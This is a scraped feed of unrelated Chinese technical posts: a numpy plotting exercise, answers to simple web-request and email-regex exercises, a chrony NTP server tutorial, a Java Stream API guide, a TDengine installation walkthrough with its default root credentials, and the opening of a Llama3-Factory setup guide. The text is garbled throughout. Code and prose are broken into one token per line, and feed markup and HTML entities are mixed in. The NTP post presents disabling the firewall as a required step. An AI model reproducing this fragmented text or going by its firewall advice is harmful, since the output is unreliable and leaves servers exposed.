numpy
as
np
labels
=
[
'none'
,
'primary'
,
'junior'
,
'senior'
,
'specialties'
,
'bachelor'
,
'master'
]
# 标签
womenCount
=
[
2052380
,
11315444
,
20435242
,
7456627
,
3014264
,
1972395
,
185028
]
birthMen
=
[
2795259
,
12698141
,
13982478
,
2887164
,
903910
,
432333
,
35915
]
birthWomen
=
[
2417485
,
11000637
,
11897674
,
2493829
,
786862
,
385718
,
32270
]
liveMen
=
[
2717613
,
12477914
,
13847346
,
2863706
,
897607
,
429809
,
35704
]
liveWomen
=
[
2362007
,
10854232
,
11815939
,
2480362
,
783225
,
384158
,
32136
]
#  请在此添加实现代码  #
# ********** Begin *********#
x
=
np
.
arange
(
len
(
labels
)
)
birth
=
np
.
array
(
birthMen
)
+
np
.
array
(
birthWomen
)
live
=
np
.
array
(
liveMen
)
+
np
.
array
(
liveWomen
)
plt
.
figure
(
figsize
=
[
14
,
5
]
)
#设置画布大小
plt
.
subplot
(
121
)
birthrate
=
(
1.0
*
live
)
/
(
1.0
*
np
.
array
(
womenCount
)
)
plt
.
plot
(
x
,
birthrate
,
'r'
)
plt
.
xticks
(
x
,
labels
)
plt
.
subplot
(
122
)
liverate
=
(
1.0
*
live
)
/
(
1.0
*
birth
)
*
100
plt
.
plot
(
x
,
liverate
,
'b'
)
plt
.
xticks
(
x
,
labels
)
plt
.
savefig
(
'picture/step4/fig4.png'
)
# ********** End **********#
网络机器人相关法律责任
第一关
from
urllib
import
request
import
sys
def
Evidence
(
url
)
:
try
:
response
=
request
.
urlopen
(
url
)
status_code
=
response
.
getcode
(
)
print
(
f"Status:
{
status_code
}
OK "
)
except
Exception
as
e
:
print
(
e
)
第二关
import
requests
def
Evidence
(
url
)
:
try
:
response
=
requests
.
get
(
url
)
if
response
.
status_code
==
200
:
print
(
"Status: 200"
)
else
:
print
(
f"Status:
{
response
.
status_code
}
"
)
except
requests
.
RequestException
as
e
:
print
(
"url请求失败"
)
第三关
import
re
def
Evidence
(
text
)
:
# 定义匹配Email地址的正则表达式
email_pattern
=
r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
# 使用re.match进行匹配
match
=
re
.
match
(
email_pattern
,
text
)
# 输出匹配结果，如果匹配不到输出None
if
match
:
print
(
match
)
else
:
print
(
None
)
后面三关
后面三关域名过期做不了
网页抓取及信息提取
域名过期做不了</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540024.html</guid><pubDate>Fri, 31 Oct 2025 07:21:06 +0000</pubDate></item><item><title>网络服务--时间服务器</title><link>https://www.ppmy.cn/news/1540025.html</link><description>NTP 是网络时间协议（Network Time Protocol）的简称，通过 udp 123 端口进行网络时钟同步。
#查看当前主机监听的端口信息 ss -lntup = netstat -lntup
[root@Client red1]# ss -lntup
Netid   State    Recv-Q   Send-Q       Local Address:Port        Peer Address:Port   Process
udp     UNCONN   0        0                  0.0.0.0:123              0.0.0.0:*       users:(("chronyd",pid=3809,fd=7))
udp     UNCONN   0        0                  0.0.0.0:5353             0.0.0.0:*       users:(("avahi-daemon",pid=868,fd=12))
udp     UNCONN   0        0                127.0.0.1:323              0.0.0.0:*       users:(("chronyd",pid=3809,fd=5))
udp     UNCONN   0        0                  0.0.0.0:52712            0.0.0.0:*       users:(("avahi-daemon",pid=868,fd=14))
udp     UNCONN   0        0                     [::]:5353                [::]:*       users:(("avahi-daemon",pid=868,fd=13))
udp     UNCONN   0        0                     [::]:58636               [::]:*       users:(("avahi-daemon",pid=868,fd=15))
udp     UNCONN   0        0                    [::1]:323                 [::]:*       users:(("chronyd",pid=3809,fd=6))
tcp     LISTEN   0        128                0.0.0.0:22               0.0.0.0:*       users:(("sshd",pid=1060,fd=3))
tcp     LISTEN   0        128              127.0.0.1:6010             0.0.0.0:*       users:(("sshd",pid=3212,fd=9))
tcp     LISTEN   0        4096             127.0.0.1:631              0.0.0.0:*       users:(("cupsd",pid=1058,fd=7))
tcp     LISTEN   0        128                   [::]:22                  [::]:*       users:(("sshd",pid=1060,fd=4))
tcp     LISTEN   0        4096                 [::1]:631                 [::]:*       users:(("cupsd",pid=1058,fd=6))
tcp     LISTEN   0        128                  [::1]:6010                [::]:*       users:(("sshd",pid=3212,fd=8))
Chrony是一个开源自由的网络时间协议 NTP 的客户端和服务器软件。它能让计算机保持系统时钟与时钟服务器（NTP）同步，因此让你的计算机保持精确的时间，Chrony也可以作为服务端软件为其他计算机提供时间同步服务。
Chrony由两个程序组成，分别是chronyd和chronyc。
chronyd是一个后台运行的守护进程，用于调整内核中运行的系统时钟和时钟服务器同步。它确定计算机增减时间的比率，并对此进行补偿。
chronyc提供了一个用户界面，用于监控性能并进行多样化的配置。它可以在chronyd实例控制的计算机上工作，也可以在一台不同的远程计算机上工作。
1、软件安装
#设置当前时区
[root@localhost ~]# timedatectl set-timezone Asia/Shanghai
#查看时区列表
[root@Client red1]# timedatectl list-timezones
[root@localhost ~]# yum install -y chrony
[root@localhost ~]# systemctl enable --now chronyd
[root@server1 ~]# cat /etc/chrony.conf
#设置时间服务器的服务端名字
server 0.centos.pool.ntp.org iburst
server 1.centos.pool.ntp.org iburst
server 2.centos.pool.ntp.org iburst    
# Allow NTP client access from local network.
#设置允许哪个客户端可以访问该服务器
#allow 192.168.0.0/16
2、配置时间服务器客户端
[root@server1 ~]# vim  /etc/chrony.conf
#此处服务器可以写国内的
server ntp.aliyun.com iburst
#重新开启chrony服务
[root@localhost ~]# systemctl restart  chronyd 
#显示获得时间服务端源的信息
[root@server1 ~]# chronyc sources
MS Name/IP address         Stratum Poll Reach LastRx Last sample
===============================================================================
^+ 203.107.6.88                  2   6    77    11  -6613us[-6613us] +/-   35ms
^- 119.28.206.193                2   6    75    11  -3318us[-3318us] +/-   63ms
^* time.neu.edu.cn               1   6    77    12  -2664us[+1472us] +/-   30ms
^- 110.42.98.138                 2   6   167     9  -3786us[-3786us] +/-   50ms
^- time.cloudflare.com           3   6    37    48  -2385us[+1751us] +/-  111ms
* 表示chronyd当前同步到的源
+ 表示可接受的信号源，与选定的信号源组合在一起
？ 指示已失去连接性或其数据包未通过所有测试的源。它也显示在启动时，直到从中至少收集了3个样本为止
3、配置时间服务器服务端
需要两个服务器，一个服务器（服务端ip：192.168.72.129）,一个客户端测试（ip:192.168.72.134,网段为192.168.72.0/24网段）
#服务端的配置
[root@localhost ~]# systemctl  disable --now firewalld #关闭防火墙
[root@localhost ~]# grep allow /etc/chrony.conf #查询allow 网段是否为192.168.72.0/24，如果不是，vimg该文件
allow 192.168.74.0/24
#allow  0.0.0.0/0
[root@localhost ~]# systemctl  restart chronyd
#客户端访问,先ping时间服务器
[root@localhost ~]# ping 192.168.168.253
[root@localhost ~]# grep iburst /etc/chrony.conf
server 192.168.168.253 iburst
[root@localhost ~]# systemctl  restart chronyd
[root@localhost ~]# chronyc sources
ntp
chronyd vim /etc/chrony.conf
#pool ntp.aliyun.com ibusrt 池（连接的服务器 ） 时间服务器的域名
allow 主机网段或者主机ip地址 允许指定网段或者主机发起时间同步
local stratum 10 定义本地时间服务器的层
chronyd vim /etc/chrony.conf
#pool 192.168.10.129 ibusrt
配置网络服务：ntp 123/udp
服务器主机操系统后台运行一个对应的软件程序，在操作系统的后台有一个或者多个进程，基于网络等待客户端发起对应网络协议连接请求，通过软件程序进程监听的端口接受请求做出对应的响应动作。
协议:区分不同服务
端口：区分不同协议，区分不同流量
s.linux9.x  --网络模式nat     192.168.10.129
# systemctl stop firewalld
1.[root@node1 ~]# rpm -qa | grep chrony
chrony-4.2-1.el9.x86_64
2.[root@node1 ~]# ps -aux | grep chrony
chrony       926  0.0  0.1  10376  2344 ?        S    18:00   0:00 /usr/sbin/chronyd -F 2
3.定义服务器标准时间
[root@node1 ~]# timedatectl set-timezone  Asia/Shanghai   (更改当前主机时区)---同一时区下的主机可以正常同步时间
[root@node1 ~]# date 111110102023
Sat Nov 11 10:10:00 AM CST 2023
4.修改程序的配置（通过当前server主机获取标准时间）
vim  /etc/chrony.conf  注释pool信息allow 192.168.10.0/24local stratum 10
#systemctl start(启动)|stop（停止）|restart（重启）|enable（开机自启）|disable（开机禁用）|reload（重载）|load（加载）|status（状态）  程序名
#systemctl restart chronyd.service#测试tcp或者udp的湍口
4 nc命令
5#例如
8nc -z-v192.168.168.34 22
nc -u-zv192.168.168.34 123c linux9.x   --nat  192.168.10.130
1.[root@server ~]# rpm -qa | grep chrony
chrony-4.2-1.el9.x86_64
2.客户发起连接请求
vim  /etc/chrony.conf
pool 192.168.10.129 iburst
3.发起连接
[root@server ~]# systemctl restart chronyd
[root@server ~]# date
Wed Oct 25 08:35:34 PM CST 2023
[root@server ~]# date
Wed Oct 25 08:35:35 PM CST 2023
[root@server ~]# date       ---时间同步成功
Sat Nov 11 10:42:00 AM CST 2023
[root@server ~]# date
Sat Nov 11 10:42:53 AM CST 2023
[root@server ~]# ^C
时间同步不成功：
1.网络不通（确保主机是同一种网络模式）
2.服务端必须关闭防火墙  systemctl stop firewalld
3.服务端和客户端的时区不一致
4.确认服务端和客户端的配置</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540025.html</guid><pubDate>Fri, 31 Oct 2025 07:21:08 +0000</pubDate></item><item><title>Java 中简化操作集合的方法</title><link>https://www.ppmy.cn/news/1540026.html</link><description>在日常 Java 开发中，我们经常需要操作集合，如
List
、
Set
和
Map
。虽然 Java 提供了丰富的集合框架供开发者使用，但在实际编写业务逻辑时，如何简化集合操作、提高代码可读性和效率，依然是一个经常遇到的问题。特别是随着 Java 8 引入的
Stream
API，我们有了更多优雅处理集合的方式。
本文将深入探讨 Java 中简化操作集合的方法，涵盖常见场景、优化策略，并通过表格对比 Java 8 之前和 Java 8 之后的集合操作，帮助开发者更直观地理解如何高效使用集合。
一、常见的集合操作场景
我们经常会遇到以下几种集合操作：
遍历集合
：对集合中的每个元素进行操作。
过滤数据
：从集合中筛选符合条件的元素。
转换集合
：将集合中的元素转换为另一种形式。
排序
：对集合中的元素进行排序。
去重
：从集合中去除重复元素。
统计
：计算集合中元素的总数、最大值、最小值等。
合并集合
：将多个集合合并为一个。
二、传统集合操作（Java 8 之前）
在 Java 8 之前，集合操作大多数依赖于手动遍历或使用
Collections
工具类。这种方式虽然能完成任务，但代码往往比较冗长且可读性不高。
举个简单的例子，假设我们有一个
List&lt;Integer&gt;
，需要从中筛选出大于 10 的数字并进行排序，代码可能如下：
List
&lt;
Integer
&gt;
numbers
=
Arrays
.
asList
(
5
,
12
,
3
,
19
,
8
,
10
)
;
List
&lt;
Integer
&gt;
result
=
new
ArrayList
&lt;
&gt;
(
)
;
for
(
Integer
number
:
numbers
)
{
if
(
number
&gt;
10
)
{
result
.
add
(
number
)
;
}
}
Collections
.
sort
(
result
)
;
System
.
out
.
println
(
result
)
;
// 输出: [12, 19]
上述代码虽然能完成任务，但步骤繁琐，需要手动控制遍历、筛选和排序。
三、Java 8 引入的简化操作
随着 Java 8 的发布，
Stream
API 大幅简化了集合操作。它提供了链式调用和声明式的编程方式，使得代码更加简洁易读。
同样的任务，使用
Stream
API 可以简化为：
List
&lt;
Integer
&gt;
numbers
=
Arrays
.
asList
(
5
,
12
,
3
,
19
,
8
,
10
)
;
List
&lt;
Integer
&gt;
result
=
numbers
.
stream
(
)
.
filter
(
n
-&gt;
n
&gt;
10
)
.
sorted
(
)
.
collect
(
Collectors
.
toList
(
)
)
;
System
.
out
.
println
(
result
)
;
// 输出: [12, 19]
通过
Stream
API，我们可以清晰地看到每个步骤的逻辑：先过滤、再排序，最后收集到新的集合中。这种写法不仅简洁，还避免了中间变量的使用，使得代码更为直观。
四、主要简化方法
1. 遍历集合
传统方式：
List
&lt;
String
&gt;
list
=
Arrays
.
asList
(
"apple"
,
"banana"
,
"orange"
)
;
for
(
String
item
:
list
)
{
System
.
out
.
println
(
item
)
;
}
简化方式（Java 8+）：
list
.
forEach
(
System
.
out
::
println
)
;
forEach
是
Stream
提供的终端操作，它接受一个
Consumer
函数接口，可以让代码更加简洁。
2. 过滤数据
传统方式：
List
&lt;
Integer
&gt;
list
=
Arrays
.
asList
(
1
,
2
,
3
,
4
,
5
)
;
List
&lt;
Integer
&gt;
evenNumbers
=
new
ArrayList
&lt;
&gt;
(
)
;
for
(
Integer
num
:
list
)
{
if
(
num
%
2
==
0
)
{
evenNumbers
.
add
(
num
)
;
}
}
简化方式（Java 8+）：
List
&lt;
Integer
&gt;
evenNumbers
=
list
.
stream
(
)
.
filter
(
num
-&gt;
num
%
2
==
0
)
.
collect
(
Collectors
.
toList
(
)
)
;
filter
操作可以轻松筛选出符合条件的元素，代码更加简洁直观。
3. 转换集合
传统方式：
List
&lt;
String
&gt;
list
=
Arrays
.
asList
(
"a"
,
"b"
,
"c"
)
;
List
&lt;
String
&gt;
upperList
=
new
ArrayList
&lt;
&gt;
(
)
;
for
(
String
item
:
list
)
{
upperList
.
add
(
item
.
toUpperCase
(
)
)
;
}
简化方式（Java 8+）：
List
&lt;
String
&gt;
upperList
=
list
.
stream
(
)
.
map
(
String
::
toUpperCase
)
.
collect
(
Collectors
.
toList
(
)
)
;
map
操作用于将集合中的元素进行转换，可以轻松实现各种映射需求。
4. 排序
传统方式：
List
&lt;
Integer
&gt;
list
=
Arrays
.
asList
(
5
,
3
,
8
,
1
)
;
Collections
.
sort
(
list
)
;
简化方式（Java 8+）：
List
&lt;
Integer
&gt;
sortedList
=
list
.
stream
(
)
.
sorted
(
)
.
collect
(
Collectors
.
toList
(
)
)
;
sorted
操作提供了更灵活的排序方式，且可以与其他流操作组合使用。
5. 去重
传统方式：
List
&lt;
Integer
&gt;
list
=
Arrays
.
asList
(
1
,
2
,
2
,
3
,
4
,
4
)
;
Set
&lt;
Integer
&gt;
uniqueSet
=
new
HashSet
&lt;
&gt;
(
list
)
;
简化方式（Java 8+）：
List
&lt;
Integer
&gt;
uniqueList
=
list
.
stream
(
)
.
distinct
(
)
.
collect
(
Collectors
.
toList
(
)
)
;
distinct
操作可以轻松去重。
五、表格对比
下表对比了 Java 8 之前和 Java 8 之后在操作集合上的简化情况：
操作类型
Java 8 之前
Java 8+ 使用 Stream 简化
遍历集合
使用
for-each
循环
使用
forEach()
过滤数据
手动筛选，需
if
判断
使用
filter()
转换集合
手动遍历转换
使用
map()
排序集合
使用
Collections.sort()
使用
sorted()
去重操作
转换为
Set
实现
使用
distinct()
汇总操作
手动累加或统计
使用
reduce()
、
count()
、
max()
、
min()
合并集合
手动遍历添加
使用
flatMap()
从表中可以看出，Java 8 之前的大多数集合操作都需要依赖显式循环和条件判断。而在 Java 8 之后，通过
Stream
API 的链式调用方式，我们可以非常自然地处理集合操作，减少了代码的复杂度。
六、综合案例
最后，让我们用一个综合案例来展示如何在 Java 8+ 中简化多种集合操作。
List
&lt;
String
&gt;
words
=
Arrays
.
asList
(
"apple"
,
"banana"
,
"orange"
,
"apple"
,
"banana"
)
;
// 将字符串转换为大写、过滤掉长度小于 6 的字符串、去重、排序
List
&lt;
String
&gt;
result
=
words
.
stream
(
)
.
map
(
String
::
toUpperCase
)
.
filter
(
word
-&gt;
word
.
length
(
)
&gt;=
6
)
.
distinct
(
)
.
sorted
(
)
.
collect
(
Collectors
.
toList
(
)
)
;
System
.
out
.
println
(
result
)
;
// 输出: [BANANA, ORANGE]
这个例子展示了从转换、过滤、去重、排序到收集的整个链式操作，代码简洁而高效。
七、总结
通过本文的介绍，我们了解了如何在 Java 中简化集合操作，特别是在 Java 8 之后，
Stream
API 提供了一种更具表现力和简洁性的编程方式。与传统的显式循环和条件判断相比，使用流操作可以让代码更加优雅、易读，并且减少了样板代码的产生。
无论是遍历、过滤、排序，还是去重和合并集合，
Stream
API 都为我们提供了便捷的方法。如果你还在使用 Java 8 之前的旧方式处理集合，建议尝试使用
Stream
，你会发现代码质量和开发效率都会有显著提升。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540026.html</guid><pubDate>Fri, 31 Oct 2025 07:21:10 +0000</pubDate></item><item><title>安装TDengine数据库3.3版本和TDengine数据库可视化管理工具</title><link>https://www.ppmy.cn/news/1540027.html</link><description>安装TDengine数据库3.3版本和TDengine数据库可视化管理工具
一、下载安装包
二、解压安装包
三、部署
四、启动服务
五、进入数据库
六、创建数据库、表和往表中插入数据
七、测试 TDengine 性能
八、使用数据库
九、查询数据
十、TDengine数据库可视化界面
一、下载安装包
TDengine-client-3.3.3.0-Linux-x64.tar.gz
TDengine-server-3.3.3.0-Linux-x64.tar.gz
二、解压安装包
tar
-zxvf TDengine-server-3.3.3.0-Linux-x64.tar.gz
三、部署
cd
TDengine-server-3.3.3.0/
./install.sh
四、启动服务
./start-all.sh
./start-all.sh 
taosd has been started successfully
taosadapter has been started successfully
taos-explorer has been started successfully
taoskeeper has been started successfully
五、进入数据库
taos
Welcome to the TDengine Command Line Interface, Client Version:3.3.3.0
Copyright
(
c
)
2023
by TDengine, all rights reserved.*********************************  Tab Completion  **************************************   The TDengine CLI supports tab completion
for
a variety of items,                   **   including database names, table names,
function
names and keywords.                **   The full list of shortcut keys is as follows:                                      **
[
TAB
]
..
..
..
complete the current word                                  **
..
..
..
if
used on a blank line, display all supported commands    **
[
Ctrl + A
]
..
..
..
move cursor to the st
[
A
]
rt of the line                     **
[
Ctrl + E
]
..
..
..
move cursor to the
[
E
]
nd of the line                       **
[
Ctrl + W
]
..
..
..
move cursor to the middle of the line                      **
[
Ctrl + L
]
..
..
..
clear
the entire
screen
**
[
Ctrl + K
]
..
..
..
clear
the
screen
after the cursor                          **
[
Ctrl + U
]
..
..
..
clear
the
screen
before the cursor                         *****************************************************************************************Server is TDengine Community Edition, ver:3.3.3.0 and will never expire.taos
&gt;
六、创建数据库、表和往表中插入数据
taos
&gt;
CREATE DATABASE demo
;
Create OK,
0
row
(
s
)
affected
(
1
.124408s
)
taos
&gt;
USE demo
;
Database changed.taos
&gt;
CREATE TABLE t
(
ts TIMESTAMP, speed INT
)
;
Create OK,
0
row
(
s
)
affected
(
0
.000997s
)
taos
&gt;
INSERT INTO t VALUES
(
'2019-07-15 00:00:00'
,
10
)
;
Insert OK,
1
row
(
s
)
affected
(
0
.000910s
)
taos
&gt;
INSERT INTO t VALUES
(
'2019-07-15 01:00:00'
,
20
)
;
Insert OK,
1
row
(
s
)
affected
(
0
.005860s
)
taos
&gt;
SELECT * FROM t
;
ts
|
speed
|
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
2019
-07-15 00:00:00.000
|
10
|
2019
-07-15 01:00:00.000
|
20
|
Query OK,
2
row
(
s
)
in
set
(
0
.005122s
)
七、测试 TDengine 性能
taosBenchmark 是一个专为测试 TDengine 性能而设计的工具，它能够全面评估TDengine 在写入、查询和订阅等方面的功能表现。该工具能够模拟大量设备产生的数据，并允许用户灵活控制数据库、超级表、标签列的数量和类型、数据列的数量和类型、子表数量、每张子表的数据量、写入数据的时间间隔、工作线程数量以及是否写入乱序数据等策略。
启动 TDengine 的服务，在终端中执行如下命令
taosBenchmark -y
系统将自动在数据库 test 下创建一张名为 meters的超级表。这张超级表将包含 10,000 张子表，表名从 d0 到 d9999，每张表包含 10,000条记录。每条记录包含 ts（时间戳）、current（电流）、voltage（电压）和 phase（相位）4个字段。时间戳范围从 “2017-07-14 10:40:00 000” 到 “2017-07-14 10:40:09 999”。每张表还带有 location 和 groupId 两个标签，其中，groupId 设置为 1 到 10，而 location 则设置为 California.Campbell、California.Cupertino 等城市信息。
执行该命令后，系统将迅速完成 1 亿条记录的写入过程。实际所需时间取决于硬件性能，但即便在普通 PC 服务器上，这个过程通常也只需要十几秒。
taosBenchmark 提供了丰富的选项，允许用户自定义测试参数，如表的数目、记录条数等。要查看详细的参数列表，请在终端中输入如下命令
taosBenchmark --help
执行命令taosBenchmark -y
taosBenchmark -y
[
10
/12
13
:53:31.737500
]
INFO: thread
[
2
]
has currently inserted rows:
6680000
, peroid insert rate:
57478.902
rows/s
[
10
/12
13
:54:01.626770
]
INFO: thread
[
7
]
has currently inserted rows:
8750000
, peroid insert rate:
56196.588
rows/s
[
10
/12
13
:54:01.636041
]
INFO: thread
[
0
]
has currently inserted rows:
8850000
, peroid insert rate:
65632.458
rows/s
[
10
/12
13
:54:01.644073
]
INFO: thread
[
3
]
has currently inserted rows:
8720000
, peroid insert rate:
59466.463
rows/s
[
10
/12
13
:54:01.714261
]
INFO: thread
[
6
]
has currently inserted rows:
9090000
, peroid insert rate:
65726.141
rows/s
[
10
/12
13
:54:01.741624
]
INFO: thread
[
5
]
has currently inserted rows:
9110000
, peroid insert rate:
63152.297
rows/s
[
10
/12
13
:54:01.781242
]
INFO: thread
[
4
]
has currently inserted rows:
9460000
, peroid insert rate:
74258.246
rows/s
[
10
/12
13
:54:01.783933
]
INFO: thread
[
2
]
has currently inserted rows:
8400000
, peroid insert rate:
57245.557
rows/s
[
10
/12
13
:54:01.839000
]
INFO: thread
[
1
]
has currently inserted rows:
8960000
, peroid insert rate:
64533.210
rows/s
[
10
/12
13
:54:31.692352
]
INFO: thread
[
0
]
has currently inserted rows:
10630000
, peroid insert rate:
59222.784
rows/s
[
10
/12
13
:54:31.738517
]
INFO: thread
[
7
]
has currently inserted rows:
10660000
, peroid insert rate:
63429.862
rows/s
[
10
/12
13
:54:31.749352
]
INFO: thread
[
6
]
has currently inserted rows:
11010000
, peroid insert rate:
63925.420
rows/s
[
10
/12
13
:54:31.804888
]
INFO: thread
[
3
]
has currently inserted rows:
10600000
, peroid insert rate:
62334.218
rows/s
[
10
/12
13
:54:31.836902
]
INFO: thread
[
2
]
has currently inserted rows:
10250000
, peroid insert rate:
61557.914
rows/s
[
10
/12
13
:54:31.946442
]
INFO: thread
[
5
]
has currently inserted rows:
11060000
, peroid insert rate:
64558.848
rows/s
[
10
/12
13
:54:32.007113
]
INFO: thread
[
4
]
has currently inserted rows:
11290000
, peroid insert rate:
60543.903
rows/s
[
10
/12
13
:54:32.014142
]
INFO: thread
[
1
]
has currently inserted rows:
10770000
, peroid insert rate:
59983.430
rows/s
[
10
/12
13
:54:55.829381
]
SUCC: thread
[
4
]
progressive mode, completed total inserted rows:
12500000
,
68051.64
records/second
[
10
/12
13
:54:58.067199
]
SUCC: thread
[
5
]
progressive mode, completed total inserted rows:
12500000
,
67456.82
records/second
[
10
/12
13
:54:58.491784
]
SUCC: thread
[
6
]
progressive mode, completed total inserted rows:
12500000
,
67453.45
records/second
[
10
/12
13
:55:00.483286
]
SUCC: thread
[
1
]
progressive mode, completed total inserted rows:
12500000
,
65938.78
records/second
[
10
/12
13
:55:01.719979
]
INFO: thread
[
0
]
has currently inserted rows:
12340000
, peroid insert rate:
56948.746
rows/s
[
10
/12
13
:55:01.839691
]
INFO: thread
[
3
]
has currently inserted rows:
12360000
, peroid insert rate:
58598.302
rows/s
[
10
/12
13
:55:01.858470
]
INFO: thread
[
7
]
has currently inserted rows:
12410000
, peroid insert rate:
58100.930
rows/s
[
10
/12
13
:55:01.984463
]
INFO: thread
[
2
]
has currently inserted rows:
12020000
, peroid insert rate:
58710.362
rows/s
[
10
/12
13
:55:02.896923
]
SUCC: thread
[
7
]
progressive mode, completed total inserted rows:
12500000
,
65533.55
records/second
[
10
/12
13
:55:03.323273
]
SUCC: thread
[
3
]
progressive mode, completed total inserted rows:
12500000
,
65662.65
records/second
[
10
/12
13
:55:03.563548
]
SUCC: thread
[
0
]
progressive mode, completed total inserted rows:
12500000
,
65438.26
records/second
[
10
/12
13
:55:03.564967
]
INFO:  pthread_join
1
..
.
[
10
/12
13
:55:03.565000
]
INFO:  pthread_join
2
..
.
[
10
/12
13
:55:04.986802
]
SUCC: thread
[
2
]
progressive mode, completed total inserted rows:
12500000
,
65438.63
records/second
[
10
/12
13
:55:04.987292
]
INFO:  pthread_join
3
..
.
[
10
/12
13
:55:04.987317
]
INFO:  pthread_join
4
..
.
[
10
/12
13
:55:04.987347
]
INFO:  pthread_join
5
..
.
[
10
/12
13
:55:04.987361
]
INFO:  pthread_join
6
..
.
[
10
/12
13
:55:04.987375
]
INFO:  pthread_join
7
..
.
[
10
/12
13
:55:04.988953
]
SUCC: Spent
213.814175
(
real
188.377236
)
seconds to insert rows:
100000000
with
8
thread
(
s
)
into
test
467695.84
(
real
530849.70
)
records/second
[
10
/12
13
:55:04.988984
]
SUCC: insert delay, min:
16
.7500ms, avg:
150
.7018ms, p90:
240
.1580ms, p95:
276
.0430ms, p99:
359
.5250ms, max:
716
.8750ms
八、使用数据库
taos
&gt;
show databases
;
name
|
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
=
information_schema
|
performance_schema
|
demo
|
log
|
test
|
Query OK,
5
row
(
s
)
in
set
(
0
.018932s
)
taos
&gt;
use
test
;
Database changed.
九、查询数据
使用上述 taosBenchmark 插入数据后，可以在 TDengine CLI（taos）输入查询命令，体验查询速度。
查询超级表 meters 下的记录总条数
SELECT COUNT(*) FROM test.meters;
taos
&gt;
SELECT COUNT
(
*
)
FROM test.meters
;
count
(
*
)
|
==
==
==
==
==
==
==
==
==
==
==
==
100000000
|
Query OK,
1
row
(
s
)
in
set
(
0
.253498s
)
查询 1 亿条记录的平均值、最大值、最小值
SELECT AVG(current), MAX(voltage), MIN(phase) FROM test.meters;
taos
&gt;
SELECT AVG
(
current
)
, MAX
(
voltage
)
, MIN
(
phase
)
FROM test.meters
;
avg
(
current
)
|
max
(
voltage
)
|
min
(
phase
)
|
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
10.208735134506226
|
258
|
145.0000000
|
Query OK,
1
row
(
s
)
in
set
(
4
.253205s
)
查询 location = “California.SanFrancisco” 的记录总条数
SELECT COUNT(*) FROM test.meters WHERE location = “California.SanFrancisco”;
taos
&gt;
SELECT COUNT
(
*
)
FROM test.meters WHERE location
=
"California.SanFrancisco"
;
count
(
*
)
|
==
==
==
==
==
==
==
==
==
==
==
==
10070000
|
Query OK,
1
row
(
s
)
in
set
(
0
.038677s
)
查询 groupId = 10 的所有记录的平均值、最大值、最小值
SELECT AVG(current), MAX(voltage), MIN(phase) FROM test.meters WHERE groupId = 10;
taos
&gt;
SELECT AVG
(
current
)
, MAX
(
voltage
)
, MIN
(
phase
)
FROM test.meters WHERE groupId
=
10
;
avg
(
current
)
|
max
(
voltage
)
|
min
(
phase
)
|
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
10.208735134506226
|
258
|
145.0000000
|
Query OK,
1
row
(
s
)
in
set
(
0
.450205s
)
对表 d1001 按每 10 秒进行平均值、最大值和最小值聚合统计
SELECT _wstart, AVG(current), MAX(voltage), MIN(phase) FROM test.d1001 INTERVAL(10s);
taos
&gt;
SELECT _wstart, AVG
(
current
)
, MAX
(
voltage
)
, MIN
(
phase
)
FROM test.d1001 INTERVAL
(
10s
)
;
_wstart
|
avg
(
current
)
|
max
(
voltage
)
|
min
(
phase
)
|
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
==
2017
-07-14
10
:40:00.000
|
10.208735134506226
|
258
|
145.0000000
|
Query OK,
1
row
(
s
)
in
set
(
0
.025560s
)
在上面的查询中，使用系统提供的伪列_wstart 来给出每个窗口的开始时间。
十、TDengine数据库可视化界面
ip:6060/explorer
用户名为 root，密码为 taosdata
TDengine数据库可视化管理工具</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540027.html</guid><pubDate>Fri, 31 Oct 2025 07:21:12 +0000</pubDate></item><item><title>Llama3-Factory模型部署新手指南</title><link>https://www.ppmy.cn/news/1540028.html</link><description>一、介绍
为了保持其公司在人工智能开源大模型领域的地位，社交巨头Meta推出了旗下最新开源模型。当地时间4月18日，Meta在官网上宣布公布了旗下最新大模型Llama 3。目前，Llama 3已经开放了80亿（8B）和700亿（70B）两个小参数版本，上下文窗口为8k。Llama3 是 Meta 公司（前身为 Facebook）开发的一个大型语言模型（LLM），它属于人工智能和自然语言处理领域的一项技术成果。Llama3 的设计目的是理解和生成人类语言，以支持各种自然语言处理任务，包括但不限于文本生成、对话系统、问答、代码理解与生成、文本摘要、翻译等。Meta表示，通过使用更高质量的训练数据和指令微调，Llama 3比前代Llama 2有了“显著提升”。
未来，Meta将推出Llama 3的更大参数版本，其将拥有超过4000亿参数。Meta也将在后续为Llama 3推出多模态等新功能，包括更长的上下文窗口，以及Llama 3研究论文。Meta在公告中写道：“通过Llama 3，我们致力于构建能够与当今最优秀的专有模型相媲美的开源模型。我们想处理开发者的反馈，提高Llama 3 的整体实用性，同时，继续在负责地使用和部署LLM（大型语言模型）方面发挥领先作用。”
Llama3 通过深度学习技术，特别是基于 Transformer 架构的预训练模型，实现了对自然语言的高度理解和生成能力。它利用了海量的文本数据进行训练，从而能够捕获语言的复杂模式和规律，并在各种自然语言处理任务中展现出卓越的性能。
此外，Llama3 的开源性质使得它更容易被研究人员和开发者所利用，进一步推动了自然语言处理技术的发展和应用。通过再训练或微调 Llama3 模型，开发者可以针对特定领域或任务进行优化，构建出更加专业化和个性化的自然语言处理系统。
二、环境需求
操作系统：Ubuntu 22.04
Anconda3：Miniconda3-latest-Linux-x86_64.sh
GPU: RTX 3090 24G
微调时是两张4090
1.更新系统
输入下列命令将系统更新及系统缺失命令下载
apt-get update
apt-get upgrade
apt-get install -y vim wget unzip lsof net-tools openssh-server git git-lfs gcc cmake build-essential
2.创建conda环境
输入下列命令，创建一个名为“llama_factory ”且Python版本号为3.11的conda环境（环境名称可随意修改）
conda create --name llama_factory python=3.11
3.激活conda环境
输入下列命令激活刚才所创建的conda环境：
conda activate llama_factory
